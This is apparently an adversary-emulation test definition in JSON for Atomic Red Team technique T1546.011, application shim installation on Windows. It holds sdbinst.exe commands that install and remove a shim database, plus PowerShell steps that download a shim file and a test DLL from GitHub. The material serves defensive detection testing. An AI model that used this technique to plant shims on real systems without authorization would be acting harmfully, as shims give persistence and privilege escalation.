{
  "id": "9ab27e22-ee62-4211-962b-d36d9a0e6a18",
  "name": "Application Shim Installation",
  "description": "Install a shim database. This technique is used for privilege escalation and bypassing user access control.\nUpon execution, \"Installation of AtomicShim complete.\" will be displayed. To verify the shim behavior, run \nthe AtomicTest.exe from the \u003cPathToAtomicsFolder\u003e\\\\T1546.011\\\\bin directory. You should see a message box appear\nwith \"Atomic Shim DLL Test!\" as defined in the AtomicTest.dll. To better understand what is happening, review\nthe source code files is the \u003cPathToAtomicsFolder\u003e\\\\T1546.011\\\\src directory.\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "46107adf-1d09-45ba-9839-00fc9932b4a0",
      "type": "execute-command",
      "data": {
        "command": "sdbinst.exe \"#{file_path}\"\n",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "c99c7682-1a62-4e22-9f96-c4ea31da9128",
      "type": "execute-command",
      "data": {
        "command": "sdbinst.exe -u \"#{file_path}\" \u003enul 2\u003e\u00261\n",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "94a46088-c97b-455c-8042-684adf28f1a2",
      "name": "Check dependency 1/2",
      "description": "Shim database file must exist on disk at specified location (#{file_path})\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{file_path}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "338fcdba-7aa1-4a17-b875-4b9b18e88ebb",
      "name": "Resolve dependency 1/2",
      "description": "Shim database file must exist on disk at specified location (#{file_path})\n",
      "type": "execute-command",
      "data": {
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory (split-path \"#{file_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.011/bin/AtomicShimx86.sdb\" -OutFile \"#{file_path}\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "6edd7d71-12dd-4a24-a235-dfca15654b25",
      "name": "Re-check dependency 1/2",
      "description": "Shim database file must exist on disk at specified location (#{file_path})\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{file_path}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "6c18dbdb-00d3-45d5-b536-dedc8f21dabc",
      "name": "Check dependency 2/2",
      "description": "AtomicTest.dll must exist at c:\\Tools\\AtomicTest.dll\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path c:\\Tools\\AtomicTest.dll) {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "c55f4ef9-7681-47b5-bc68-f4550b192287",
      "name": "Resolve dependency 2/2",
      "description": "AtomicTest.dll must exist at c:\\Tools\\AtomicTest.dll\n",
      "type": "execute-command",
      "data": {
        "command": "New-Item -Type Directory (split-path c:\\Tools\\AtomicTest.dll) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.011/bin/AtomicTest.dll\" -OutFile c:\\Tools\\AtomicTest.dll\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "2b70ac4e-d1b0-4bc6-9cc6-aa247ed9c9ec",
      "name": "Re-check dependency 2/2",
      "description": "AtomicTest.dll must exist at c:\\Tools\\AtomicTest.dll\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path c:\\Tools\\AtomicTest.dll) {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "46107adf-1d09-45ba-9839-00fc9932b4a0",
      "p": "on-success",
      "o": "c99c7682-1a62-4e22-9f96-c4ea31da9128"
    },
    {
      "s": "46107adf-1d09-45ba-9839-00fc9932b4a0",
      "p": "on-failure",
      "o": "c99c7682-1a62-4e22-9f96-c4ea31da9128"
    },
    {
      "s": "94a46088-c97b-455c-8042-684adf28f1a2",
      "p": "on-success",
      "o": "46107adf-1d09-45ba-9839-00fc9932b4a0"
    },
    {
      "s": "94a46088-c97b-455c-8042-684adf28f1a2",
      "p": "on-failure",
      "o": "338fcdba-7aa1-4a17-b875-4b9b18e88ebb"
    },
    {
      "s": "338fcdba-7aa1-4a17-b875-4b9b18e88ebb",
      "p": "on-success",
      "o": "6edd7d71-12dd-4a24-a235-dfca15654b25"
    },
    {
      "s": "6edd7d71-12dd-4a24-a235-dfca15654b25",
      "p": "on-failure",
      "o": "46107adf-1d09-45ba-9839-00fc9932b4a0"
    },
    {
      "s": "6c18dbdb-00d3-45d5-b536-dedc8f21dabc",
      "p": "on-success",
      "o": "46107adf-1d09-45ba-9839-00fc9932b4a0"
    },
    {
      "s": "6c18dbdb-00d3-45d5-b536-dedc8f21dabc",
      "p": "on-failure",
      "o": "c55f4ef9-7681-47b5-bc68-f4550b192287"
    },
    {
      "s": "c55f4ef9-7681-47b5-bc68-f4550b192287",
      "p": "on-success",
      "o": "2b70ac4e-d1b0-4bc6-9cc6-aa247ed9c9ec"
    },
    {
      "s": "2b70ac4e-d1b0-4bc6-9cc6-aa247ed9c9ec",
      "p": "on-failure",
      "o": "46107adf-1d09-45ba-9839-00fc9932b4a0"
    }
  ],
  "tags": [
    "T1546.011",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "file_path",
      "type": "string",
      "description": "Path to the shim database file",
      "value": "PathToAtomicsFolder\\T1546.011\\bin\\AtomicShimx86.sdb"
    }
  ]
}